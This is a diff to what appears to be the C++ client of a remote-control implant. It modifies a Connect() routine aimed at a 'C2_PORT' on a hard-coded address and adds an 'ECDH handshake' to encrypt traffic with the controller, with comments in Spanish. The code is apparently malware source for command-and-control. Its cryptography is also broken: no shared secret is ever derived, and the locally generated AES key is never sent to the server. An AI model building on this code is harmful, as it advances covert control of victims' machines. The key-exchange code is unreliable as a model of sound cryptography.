@@ -487,27 +487,173 @@ public:
         WSACleanup();
     }
     
-    bool Connect() {
-        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (sock == INVALID_SOCKET) return false;
-        
-        int timeout = 15000;
-        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
-        
-        sockaddr_in server = { 0 };
-        server.sin_family = AF_INET;
-        server.sin_port = htons(C2_PORT);
-        inet_pton(AF_INET, "192.168.254.137", &server.sin_addr);
-        
-        if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
+bool Connect() {
+    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) return false;
+    
+    int timeout = 15000;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
+    
+    sockaddr_in server = { 0 };
+    server.sin_family = AF_INET;
+    server.sin_port = htons(C2_PORT);
+    inet_pton(AF_INET, "192.168.254.137", &server.sin_addr);
+    
+    if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
+        // === NUEVO: HACER HANDSHAKE ===
+        if (PerformKeyExchange()) {
             connected = true;
             return true;
+        } else {
+            closesocket(sock);
+            return false;
         }
-        
-        closesocket(sock);
+    }
+    
+    closesocket(sock);
+    return false;
+}
+
+// AÑADE ESTA FUNCIÓN COMPLETA (línea ~600-750)
+bool PerformKeyExchange() {
+    Log("Iniciando handshake ECDH");
+    
+    // Generar par de claves ECDH
+    HCRYPTKEY hPrivateKey = NULL;
+    if (!CryptGenKey(hProv, CALG_ECDH_EPHEM, CRYPT_EXPORTABLE, &hPrivateKey)) {
+        LogError("CryptGenKey", GetLastError());
         return false;
     }
+    
+    // Exportar a PUBLICKEYBLOB
+    BYTE publicKeyBlob[512] = {0};
+    DWORD blobLen = sizeof(publicKeyBlob);
+    if (!CryptExportKey(hPrivateKey, NULL, PUBLICKEYBLOB, 0, publicKeyBlob, &blobLen)) {
+        LogError("CryptExportKey", GetLastError());
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    // ===== CONVERSIÓN A DER =====
+    // Preparar estructura CERT_PUBLIC_KEY_INFO
+    CERT_PUBLIC_KEY_INFO pubKeyInfo = {0};
+    pubKeyInfo.Algorithm.pszObjId = (LPSTR)szOID_ECDH_P256;
+    
+    // Los datos de la clave están después del header PUBLICKEYBLOB
+    BLOBHEADER* header = (BLOBHEADER*)publicKeyBlob;
+    DWORD keyDataOffset = sizeof(BLOBHEADER) + sizeof(ALG_ID);
+    
+    pubKeyInfo.PublicKey.cbData = blobLen - keyDataOffset;
+    pubKeyInfo.PublicKey.pbData = publicKeyBlob + keyDataOffset;
+    
+    // Codificar a DER
+    DWORD derLen = 0;
+    if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, 
+                             &pubKeyInfo, CRYPT_ENCODE_ALLOC_FLAG, NULL, 
+                             NULL, &derLen)) {
+        LogError("CryptEncodeObjectEx (size)", GetLastError());
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    BYTE* derData = (BYTE*)malloc(derLen);
+    if (!derData) {
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, 
+                             &pubKeyInfo, CRYPT_ENCODE_ALLOC_FLAG, NULL, 
+                             derData, &derLen)) {
+        LogError("CryptEncodeObjectEx (encode)", GetLastError());
+        free(derData);
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    Log("DER encoded key size: " + std::to_string(derLen) + " bytes");
+    
+    // Enviar LONGITUD (4 bytes) + DER
+    uint32_t len_prefix = htonl(derLen);
+    if (send(sock, (char*)&len_prefix, 4, 0) != 4) {
+        free(derData);
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    if (send(sock, (char*)derData, derLen, 0) != derLen) {
+        free(derData);
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    free(derData);
+    
+    // ===== RECIBIR CLAVE DEL SERVER =====
+    uint32_t resp_len;
+    if (recv(sock, (char*)&resp_len, 4, 0) != 4) {
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    resp_len = ntohl(resp_len);
+    
+    std::vector<BYTE> serverDer(resp_len);
+    if (recv(sock, (char*)serverDer.data(), resp_len, 0) != resp_len) {
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    // Decodificar DER a PUBLICKEYBLOB
+    CERT_PUBLIC_KEY_INFO* serverKeyInfo = NULL;
+    DWORD serverInfoLen = 0;
+    
+    if (!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO,
+                             serverDer.data(), resp_len,
+                             CRYPT_DECODE_ALLOC_FLAG, NULL,
+                             &serverKeyInfo, &serverInfoLen)) {
+        LogError("CryptDecodeObjectEx", GetLastError());
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    // Importar clave pública del server
+    HCRYPTKEY hServerPublic = NULL;
+    if (!CryptImportKey(hProv, serverKeyInfo->PublicKey.pbData,
+                        serverKeyInfo->PublicKey.cbData, NULL, 0, &hServerPublic)) {
+        LogError("CryptImportKey (server)", GetLastError());
+        LocalFree(serverKeyInfo);
+        CryptDestroyKey(hPrivateKey);
+        return false;
+    }
+    
+    LocalFree(serverKeyInfo);
+    
+    // ===== GENERAR CLAVE DE SESIÓN =====
+    if (!CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hSessionKey)) {
+        LogError("CryptGenKey (session)", GetLastError());
+        CryptDestroyKey(hPrivateKey);
+        CryptDestroyKey(hServerPublic);
+        return false;
+    }
+    
+    // Exportar la clave para usarla en cifrado
+    BYTE keyBlob[512] = {0};
+    DWORD keyBlobLen = sizeof(keyBlob);
+    if (CryptExportKey(hSessionKey, NULL, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobLen)) {
+        DWORD keyOffset = sizeof(BLOBHEADER) + sizeof(ALG_ID);
+        memcpy(sessionKey, keyBlob + keyOffset, GCM_256_KEY_SIZE);
+    }
+    
+    // Generar IV
+    CryptGenRandom(hProv, GCM_256_IV_SIZE, sessionIV);
+    
+    CryptDestroyKey(hPrivateKey);
+    CryptDestroyKey(hServerPublic);
+    
+    Log("Key exchange completado exitosamente");
+    return true;
+}
     
     std::string Encrypt(const std::string& plaintext) {
         // XOR simple (en producción usar AES)
